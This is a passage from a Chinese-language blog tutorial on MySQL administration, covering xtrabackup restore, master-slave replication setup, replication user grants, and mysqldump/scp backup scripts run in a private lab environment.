--target-dir=/data/xtrabackup</span><br><br><span class="hljs-comment">--拷贝到数据库的数据目录</span><br>xtrabackup <span class="hljs-operator">-</span>uroot <span class="hljs-operator">-</span>p123 <span class="hljs-comment">--copy-back --target-dir=/data/xtrabackup</span><br><br><span class="hljs-comment">--修改新的数据库目录</span><br>chown <span class="hljs-operator">-</span>R mysql.mysql <span class="hljs-operator">/</span>data<span class="hljs-operator">/</span>xtrabackup<br></code></pre></td></tr></table></figure><h1 id="4-实现mysql主从复制，主主复制和半同步复制"><a href="#4-实现mysql主从复制，主主复制和半同步复制" class="headerlink" title="4.实现mysql主从复制，主主复制和半同步复制"></a>4.实现mysql主从复制，主主复制和半同步复制</h1><p><img src="2792175-20221007225923571-650420805.png" alt="img"></p><p>MySQL主从复制原理：</p><p>1.主节点数据更新</p><p>2.写入到主节点的binlog，更新pos</p><p>3.根据主从复制的关系，show processlist，自动复制到从节点的slave_io_thead线程</p><p>4.从节点写入relay_log</p><p>5.通过从节点的sql_io_thread写入到数据，实现同步</p><h1 id="搭建MySQL主从同步环境"><a href="#搭建MySQL主从同步环境" class="headerlink" title="搭建MySQL主从同步环境"></a>搭建MySQL主从同步环境</h1><p>环境：主master 10.0.0.132，基本步骤，注意：主从复制关系在机器服务重启后仍然保持同步状态；从节点关机后，在开机后马上可以同步过来，如果数据量大存在一定的延迟</p><p>从slave：10.0.0.128</p><p>version：mysql 8.0.30</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1.</span>主节点<br><span class="hljs-number">1</span>） 二进制日志<br><span class="hljs-number">2</span>） server_id<span class="hljs-operator">=</span><br><span class="hljs-number">3</span>) 创建用户，replication slave 权限<br><span class="hljs-number">4</span>） 全备份 <span class="hljs-comment">--master-data=1，--master-data=2，binlog的pos加上注释</span><br><br><span class="hljs-number">2.</span>从节点<br><span class="hljs-number">1</span>) server_id<span class="hljs-operator">=</span><br><span class="hljs-number">2</span>) source <span class="hljs-operator">/</span>data<span class="hljs-operator">/</span>full.sql 导入备份<br><span class="hljs-number">3</span>) CHANGE MASTER <span class="hljs-keyword">TO</span>      修改主节点信息<br>MASTER_HOST<span class="hljs-operator">=</span><span class="hljs-string">&#x27;10.0.0.8&#x27;</span>,<br>MASTER_USER<span class="hljs-operator">=</span><span class="hljs-string">&#x27;repluser&#x27;</span>,<br>MASTER_PASSWORD<span class="hljs-operator">=</span><span class="hljs-string">&#x27;123456&#x27;</span>,<br>MASTER_PORT<span class="hljs-operator">=</span><span class="hljs-number">3306</span>,<br>MASTER_LOG_FILE<span class="hljs-operator">=</span><span class="hljs-string">&#x27;mysql-bin.000002&#x27;</span>, MASTER_LOG_POS<span class="hljs-operator">=</span><span class="hljs-number">30489887</span>,<br>MASTER_CONNECT_RETRY<span class="hljs-operator">=</span><span class="hljs-number">5</span>;<br><span class="hljs-number">4</span>) <span class="hljs-keyword">start</span> slave;<br><br>stop slave;<br>reset slave <span class="hljs-keyword">all</span>; ##重置从节点<br>master status：执行DML语句后的pos开始复制<br><span class="hljs-keyword">start</span> slave;<br><br><span class="hljs-number">3.</span>主主架构<br></code></pre></td></tr></table></figure><h2 id="1-开启binlog"><a href="#1-开启binlog" class="headerlink" title="1.开启binlog"></a>1.开启binlog</h2><p>如果是8.0及以下得版本，则需要手动开启binlog</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql">##<span class="hljs-number">8.0</span>默认开启binlog<br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> &quot;%log_bin%&quot;;<br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> &quot;%sql_log_bin%&quot;;<br><br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> sql_log_bin<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<br><br>vim <span class="hljs-operator">/</span>etc<span class="hljs-operator">/</span>my.cnf<br>log_bin<span class="hljs-operator">=</span><span class="hljs-operator">/</span>data<span class="hljs-operator">/</span>mysql<span class="hljs-operator">/</span>binlog<span class="hljs-operator">/</span>matser<span class="hljs-operator">-</span>bin <span class="hljs-comment">---&gt;指定Binlog日志文件的前缀</span><br>systemctl restart mysqld<br><br>flush logs; <span class="hljs-comment">--更新日志文件，更新Binlog</span><br></code></pre></td></tr></table></figure><h2 id="2-配置主从节点基本信息"><a href="#2-配置主从节点基本信息" class="headerlink" title="2.配置主从节点基本信息"></a>2.配置主从节点基本信息</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sql">##主节点，修改hostname<br>hostnamectl <span class="hljs-keyword">set</span><span class="hljs-operator">-</span>hostname master<br><br>##修改mysqld配置文件中的server<span class="hljs-operator">-</span>id，可以配置为<span class="hljs-number">1</span>，每个节点的server<span class="hljs-operator">-</span>id一定要不一样，不然无法区分<br>可以配置为IP地址最后一位<br>vim <span class="hljs-operator">/</span>etc<span class="hljs-operator">/</span>my.cnf<br>[mysqld]<br>server<span class="hljs-operator">-</span>id<span class="hljs-operator">=</span><span class="hljs-number">132</span><br><br>##查看主节点的二进制文件信息，不用指定任何库，直接复制所有新增写入的数据，从这个binlog的pos开始复制，<span class="hljs-comment">--start-position=157</span><br>[(<span class="hljs-keyword">none</span>)]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> master status;<br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+----------+--------------+------------------+-------------------+</span><br><span class="hljs-operator">|</span> File             <span class="hljs-operator">|</span> Position <span class="hljs-operator">|</span> Binlog_Do_DB <span class="hljs-operator">|</span> Binlog_Ignore_DB <span class="hljs-operator">|</span> Executed_Gtid_Set <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+----------+--------------+------------------+-------------------+</span><br><span class="hljs-operator">|</span> rocky<span class="hljs-operator">-</span>bin<span class="hljs-number">.000019</span> <span class="hljs-operator">|</span>      <span class="hljs-number">157</span> <span class="hljs-operator">|</span>              <span class="hljs-operator">|</span>                  <span class="hljs-operator">|</span>                   <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+----------+--------------+------------------+-------------------+</span><br></code></pre></td></tr></table></figure><h2 id="3-主节点创建同步账号，授权"><a href="#3-主节点创建同步账号，授权" class="headerlink" title="3.主节点创建同步账号，授权"></a>3.主节点创建同步账号，授权</h2><h3 id="revoke回收权限"><a href="#revoke回收权限" class="headerlink" title="revoke回收权限"></a>revoke回收权限</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sql">##查看catyer这个用户的权限<br><span class="hljs-keyword">show</span> grants <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;catyer&#x27;</span>@<span class="hljs-string">&#x27;10.0.0.%&#x27;</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------------------------------+</span><br><span class="hljs-operator">|</span> Grants <span class="hljs-keyword">for</span> catyer<span class="hljs-variable">@10</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>.<span class="hljs-operator">%</span>                                <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------------------------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-keyword">GRANT</span> USAGE <span class="hljs-keyword">ON</span> <span class="hljs-operator">*</span>.<span class="hljs-operator">*</span> <span class="hljs-keyword">TO</span> `catyer`@`<span class="hljs-number">10.0</span><span class="hljs-number">.0</span>.<span class="hljs-operator">%</span>`                 <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> <span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> PRIVILEGES <span class="hljs-keyword">ON</span> `zabbix`.<span class="hljs-operator">*</span> <span class="hljs-keyword">TO</span> `catyer`@`<span class="hljs-number">10.0</span><span class="hljs-number">.0</span>.<span class="hljs-operator">%</span>` <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------------------------------+</span><br><br>##回收删除权限<br><span class="hljs-keyword">revoke</span> <span class="hljs-keyword">delete</span> <span class="hljs-keyword">on</span> hellodb.<span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> catyer@<span class="hljs-string">&#x27;10.0.0.%&#x27;</span>;<br>flush privileges;<br><br>##回收所有权限<br><span class="hljs-keyword">revoke</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">on</span> hellodb.<span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> catyer@<span class="hljs-string">&#x27;10.0.0.%&#x27;</span>;<br>flush privileges;<br></code></pre></td></tr></table></figure><p>各版本之间的差异，一定要执行grant，不然会出现无法生成master节点的dump线程</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs sql">##早期版本<span class="hljs-number">5.7</span>左右，授权<span class="hljs-operator">+</span>创建账号<br><span class="hljs-keyword">grant</span> replication slave <span class="hljs-keyword">on</span> <span class="hljs-operator">*</span>.<span class="hljs-operator">*</span> <span class="hljs-keyword">to</span> sync@<span class="hljs-string">&#x27;%‘ identified by &#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">--MySQL 8.0版本</span><br><span class="hljs-string">create user xxx@&#x27;</span><span class="hljs-operator">%</span><span class="hljs-string">&#x27; identified by &#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27;;</span><br><span class="hljs-string">show grants for sync@&#x27;</span><span class="hljs-operator">%</span><span class="hljs-string">&#x27;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">##回收权限，刷新权限，赋予复制权限</span><br><span class="hljs-string">revoke all on *.* from sync@&#x27;</span><span class="hljs-operator">%</span><span class="hljs-string">&#x27;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">grant replication slave on *.* to sync@&#x27;</span><span class="hljs-operator">%</span><span class="hljs-string">&#x27;;</span><br><span class="hljs-string">flush privileges;</span><br><span class="hljs-string"></span><br><span class="hljs-string">[(none)]&gt;show grants for sync@&#x27;</span><span class="hljs-operator">%</span><span class="hljs-string">&#x27;;</span><br><span class="hljs-string">+----------------------------------------------+</span><br><span class="hljs-string">| Grants for sync@%                            |</span><br><span class="hljs-string">+----------------------------------------------+</span><br><span class="hljs-string">| GRANT REPLICATION SLAVE ON *.* TO `sync`@`%` |</span><br><span class="hljs-string">+----------------------------------------------+</span><br><span class="hljs-string">1 row in set (0.01 sec)</span><br><span class="hljs-string"></span><br><span class="hljs-string">这一条是failed，证明sync用户没有replication的权限</span><br></code></pre></td></tr></table></figure><p><img src="2792175-20221007225923868-1542748766.png" alt="img"></p><h2 id="4-主节点做一份全备，导入到备节点，确保初始数据一致"><a href="#4-主节点做一份全备，导入到备节点，确保初始数据一致" class="headerlink" title="4.主节点做一份全备，导入到备节点，确保初始数据一致"></a>4.主节点做一份全备，导入到备节点，确保初始数据一致</h2><p>可以考虑将所有都备份导出一次，形成不同的.sql文件，然后使用存储过程批量导入.sql数据，写成脚本或者是MySQL的存储过程—&gt;可以查一下，直接或者写成事务，批量化执行，最好是脚本</p><p>因为从库可能是新库，初始数据不一致，如果直接同步的话那就只有新数据，没有老数据了</p><h3 id="单库备份"><a href="#单库备份" class="headerlink" title="单库备份"></a>单库备份</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>TIME=`<span class="hljs-built_in">date</span> +%Y-%m-%d_%H-%M-%S`<br>DIR=/data/backup<br>DB=<span class="hljs-string">&quot;hellodb&quot;</span><br>PASS=123<br>HOST=10.0.0.128<br><br><span class="hljs-comment">##-B表示选择</span><br>[ -d <span class="hljs-variable">$DIR</span> ] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;dir exist&quot;</span> || <span class="hljs-built_in">mkdir</span> -p <span class="hljs-variable">$DIR</span><br>mysqldump -uroot -p<span class="hljs-variable">$PASS</span> --single-transaction --source-data=2 -B <span class="hljs-variable">$DB</span> -F | gzip &gt; <span class="hljs-variable">$&#123;DIR&#125;</span>/<span class="hljs-variable">$&#123;DB&#125;</span>.<span class="hljs-variable">$&#123;TIME&#125;</span>.sql.gz<br><span class="hljs-comment">#mysqldump -usync -p$PASS -h$HOST --single-transaction --source-data=2 -A | gzip &gt; /data/backup/backup.sql.gz</span><br><br>scp <span class="hljs-variable">$&#123;DIR&#125;</span>/<span class="hljs-variable">$&#123;DB&#125;</span>.<span class="hljs-variable">$&#123;TIME&#125;</span>.sql.gz <span class="hljs-variable">$HOST</span>:/data/backup<br></code></pre></td></tr></table></figure><h3 id="多库备份，除去系统库-expect-ssh交互"><a href="#多库备份，除去系统库-expect-ssh交互" class="headerlink" title="多库备份，除去系统库+expect ssh交互"></a>多库备份，除去系统库+expect ssh交互</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>TIME=`<span class="hljs-built_in">date</span> +%F_%T`<br>DIR=/data/backup<br>DB=<span class="hljs-string">&quot;hellodb&quot;</span><br>PASS=123<br><br><span class="hljs-comment">##批量化复制主机</span><br>HOST=(10.0.0.128<br>10.0.0.129)<br><br><br>[ -d <span class="hljs-variable">$DIR</span> ] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;dir exist&quot;</span> || <span class="hljs-built_in">mkdir</span> -p <span class="hljs-variable">$DIR</span><br>mysqldump -uroot -p<span class="hljs-variable">$PASS</span> --single-transaction --source-data=2 -A -F &gt; <span class="hljs-variable">$&#123;DIR&#125;</span>/<span class="hljs-variable">$&#123;DB&#125;</span>_<span class="hljs-variable">$&#123;TIME&#125;</span>_all.sql<br><span class="hljs-comment">#mysqldump -usync -p$PASS -h$HOST --single-transaction --source-data=2 -A | gzip &gt; /data/backup/backup.sql.gz</span><br><br><span class="hljs-keyword">for</span> IP <span class="hljs-keyword">in</span> <span class="hljs-variable">$&#123;HOST[*]&#125;</span>;<span class="hljs-keyword">do</span><br>        <span class="hljs-comment">#免交互复制ssh-keygen到目的主机</span><br>        expect &lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">        spawn ssh-copy-id root@$IP</span><br><span class="hljs-string">        expect &#123;</span><br><span class="hljs-string">                &quot;yes/no&quot; &#123;send &quot;yes\n&quot;;exp_continue&#125;</span><br><span class="hljs-string">                &quot;password&quot; &#123;send &quot;123\n&quot;&#125;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">        expect eof</span><br><span class="hljs-string">EOF</span><br>        scp <span class="hljs-variable">$&#123;DIR&#125;</span>/<span class="hljs-variable">$&#123;DB&#125;</span>_<span class="hljs-variable">$&#123;TIME&#125;</span>_all.sql <span class="hljs-variable">$IP</span>:/data/backup<br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$IP</span> copy success&quot;</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><h3 id="完全备份-A，直接source就行，不用选库"><a href="#完全备份-A，直接source就行，不用选库" class="headerlink" title="完全备份-A，直接source就行，不用选库"></a>完全备份-A，直接source就行，不用选库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##-A完全备份，-F刷新日志</span><br><span class="hljs-comment">##!/bin/bash</span><br>TIME=`<span class="hljs-built_in">date</span> +%Y-%m-%d_%H-%M-%S`<br>DIR=/data/backup<br>DB=<span class="hljs-string">&quot;hellodb&quot;</span><br>PASS=123<br>HOST=10.0.0.128<br><br>[ -d <span class="hljs-variable">$DIR</span> ] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;dir exist&quot;</span> || <span class="hljs-built_in">mkdir</span> -p <span class="hljs-variable">$DIR</span><br>mysqldump -uroot -p<span class="hljs-variable">$PASS</span> --single-transaction --source-data=2 -A -F &gt; <span class="hljs-variable">$&#123;DIR&#125;</span>/<span class="hljs-variable">$&#123;DB&#125;</span>_<span class="hljs-variable">$&#123;TIME&#125;</span>_all.sql<br><span class="hljs-comment">#mysqldump -usync -p$PASS -h$HOST --single-transaction --source-data=2 -A | gzip &gt; /data/backup/backup.sql.gz</span><br><br>scp <span class="hljs-variable">$&#123;DIR&#125;</span>/<span class="hljs-variable">$&#123;DB&#125;</span>_<span class="hljs-variable">$&#123;TIME&#125;</span>_all.sql <span class="hljs-variable">$HOST</span>:/data/backup<br><br>[zabbix]&gt;<span class="hljs-built_in">source</span> /data/backup/hellodb_2022-09-11_09-15-11_all.sql<br></code></pre></td></tr></table></figure><p>主节点看一下dump线程，在运行的线程</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> processlist;<br>[(<span class="hljs-keyword">none</span>)]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> processlist;<br><span class="hljs-operator">+</span><span class="hljs-comment">----+-----------------+-----------+------+---------+------+------------------------+------------------+</span><br><span class="hljs-operator">|</span> Id <span class="hljs-operator">|</span> <span class="hljs-keyword">User</span>            <span class="hljs-operator">|</span> Host      <span class="hljs-operator">|</span> db   <span class="hljs-operator">|</span> Command <span class="hljs-operator">|</span> <span class="hljs-type">Time</span> <span class="hljs-operator">|</span> State                  <span class="hljs-operator">|</span> Info             <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----+-----------------+-----------+------+---------+------+------------------------+------------------+</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">5</span> <span class="hljs-operator">|</span> event_scheduler <span class="hljs-operator">|</span> localhost <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span> <span class="hljs-operator">|</span> Daemon  <span class="hljs-operator">|</span> <span class="hljs-number">7920</span> <span class="hljs-operator">|</span> Waiting <span class="hljs-keyword">on</span> <span class="hljs-keyword">empty</span> queue <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>             <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> <span class="hljs-number">52</span> <span class="hljs-operator">|</span> root            <span class="hljs-operator">|</span> localhost <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span> <span class="hljs-operator">|</span> Query   <span class="hljs-operator">|</span>    <span class="hljs-number">0</span> <span class="hljs-operator">|</span> init                   <span class="hljs-operator">|</span> <span class="hljs-keyword">show</span> processlist <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----+-----------------+-----------+------+---------+------+------------------------+------------------+</span><br></code></pre></td></tr></table></figure><h3 id="单表备份：直接备份一个库内的一个表"><a href="#单表备份：直接备份一个库内的一个表" class="headerlink" title="单表备份：直接备份一个库内的一个表"></a>单表备份：直接备份一个库内的一个表</h3><p>也可以备份多张表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs sql">##假如不小心清空从库表的数据<br><span class="hljs-keyword">truncate</span> <span class="hljs-keyword">table</span> stu;<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> stu;<br><span class="hljs-keyword">Empty</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br><br>##导出单表，还原<br>mysqldump <span class="hljs-operator">-</span>uroot <span class="hljs-operator">-</span>p123 hellodb stu <span class="hljs-operator">&gt;</span> <span class="hljs-operator">/</span>data<span class="hljs-operator">/</span>stu.sql<br>scp <span class="hljs-operator">/</span>data<span class="hljs-operator">/</span>stu.sql <span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.128</span>:<span class="hljs-operator">/</span>data<span class="hljs-operator">/</span><br><br>source <span class="hljs-operator">/</span>data<span class="hljs-operator">/</span>stu.sql<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> stu <span class="hljs-keyword">where</span> stuid<span class="hljs-operator">=</span><span class="hljs-number">25</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">-------+-------------+-----+--------+</span><br><span class="hljs-operator">|</span> StuID <span class="hljs-operator">|</span> Name        <span class="hljs-operator">|</span> Age <span class="hljs-operator">|</span> Gender <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------+-------------+-----+--------+</span><br><span class="hljs-operator">|</span>    <span class="hljs-number">25</span> <span class="hljs-operator">|</span> Sun Dasheng <span class="hljs-operator">|</span> <span class="hljs-number">100</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------+-------------+-----+--------+</span><br><br>##备份多张表<br>mysqldump <span class="hljs-operator">-</span>uroot <span class="hljs-operator">-</span>p123 hellodb stu teachers job <span class="hljs-operator">&gt;</span> <span class="hljs-operator">/</span>data<span class="hljs-operator">/</span>stu.sql<br></code></pre></td></tr></table></figure><h2 id="5-从节点配置文件以及导入备份，基于线程来复制"><a href="#5-从节点配置文件以及导入备份，基于线程来复制" class="headerlink" title="5.从节点配置文件以及导入备份，基于线程来复制"></a>5.从节点配置文件以及导入备份，基于线程来复制</h2><p>可以先导入文件，再show master status记录下binlog的pos和名字，再执行change master</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs sql">vim <span class="hljs-operator">/</span>etc<span class="hljs-operator">/</span>my.cnf<br>read<span class="hljs-operator">-</span><span class="hljs-keyword">only</span> ##只读，防止普通用户修改数据，不能防止root<br><br>CHANGE MASTER <span class="hljs-keyword">TO</span><br>  MASTER_HOST<span class="hljs-operator">=</span><span class="hljs-string">&#x27;10.0.0.132&#x27;</span>,<br>  MASTER_USER<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sync&#x27;</span>,<br>  MASTER_PASSWORD<span class="hljs-operator">=</span><span class="hljs-string">&#x27;123&#x27;</span>,<br>  MASTER_PORT<span class="hljs-operator">=</span><span class="hljs-number">3306</span>,<br>  MASTER_LOG_FILE<span class="hljs-operator">=</span><span class="hljs-string">&#x27;mysql-bin.000002&#x27;</span>, MASTER_LOG_POS<span class="hljs-operator">=</span><span class="hljs-number">30489887</span>,<br>  MASTER_CONNECT_RETRY<span class="hljs-operator">=</span><span class="hljs-number">5</span>;<br><br>##取消掉注释，复制过去，从节点加上binlog选项<br>CHANGE MASTER <span class="hljs-keyword">TO</span><br>MASTER_HOST<span class="hljs-operator">=</span><span class="hljs-string">&#x27;10.0.0.132&#x27;</span>,<br>MASTER_USER<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sync&#x27;</span>,<br>MASTER_PASSWORD<span class="hljs-operator">=</span><span class="hljs-string">&#x27;123&#x27;</span>,<br>MASTER_PORT<span class="hljs-operator">=</span><span class="hljs-number">3306</span>,<br>MASTER_LOG_FILE<span class="hljs-operator">=</span><span class="hljs-string">&#x27;rocky-bin.000783&#x27;</span>, MASTER_LOG_POS<span class="hljs-operator">=</span><span class="hljs-number">197</span>;<br></code></pre></td></tr></table></figure><p><img src="2792175-20221007225924139-204310218.png" alt="img"></p><p>关闭二进制，再导入，查看从节点的信息，发生生成了中继日志，即master的binlog写过来的日志存放文件relay_log，SLAVE_IO还是not running，开启复制线程</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">set</span> sql_log_bin<span class="hljs-operator">=</span><span class="hljs-number">0</span>;<br>source <span class="hljs-operator">/</span>data<span class="hljs-operator">/</span>backup<span class="hljs-operator">/</span>hellodb_2022<span class="hljs-number">-09</span><span class="hljs-number">-11</span>_10<span class="hljs-number">-48</span><span class="hljs-number">-26</span>_all.sql<br><br><span class="hljs-keyword">show</span> slave status\G;<br>[zabbix]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> slave status\G;<br><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span> <span class="hljs-number">1.</span> <span class="hljs-type">row</span> <span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span 